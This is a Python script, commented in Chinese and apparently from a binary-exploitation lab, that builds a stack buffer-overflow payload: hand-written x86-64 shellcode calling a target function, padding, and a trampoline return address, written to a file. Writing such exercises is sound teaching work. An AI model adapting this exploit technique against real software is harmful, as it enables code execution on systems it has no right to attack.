import struct

# 1. 基础信息
total_offset = 40         # 到返回地址的总距离 (32 buffer + 8 saved_rbp)
jmp_xs_addr  = 0x401334   # 蹦床函数地址

# 2. 构造 Shellcode (机器码)
# 对应汇编:
# mov rdi, 0x72      (参数 114)
# mov rax, 0x401216  (func1 地址)
# call rax           (调用 func1)
shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00' + \
            b'\x48\xc7\xc0\x16\x12\x40\x00' + \
            b'\xff\xd0'

# 3. 计算填充长度
# 我们把 shellcode 放在最前面，剩下的空间用 'A' 填满
pad_len = total_offset - len(shellcode)

# 4. 拼接 Payload
# [Shellcode] + [Padding] + [jmp_xs 地址]
payload = shellcode + (b'A' * pad_len) + struct.pack('<Q', jmp_xs_addr)

# 5. 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated.")
print(f"Shellcode length: {len(shellcode)}")
print(f"Padding length: {pad_len}")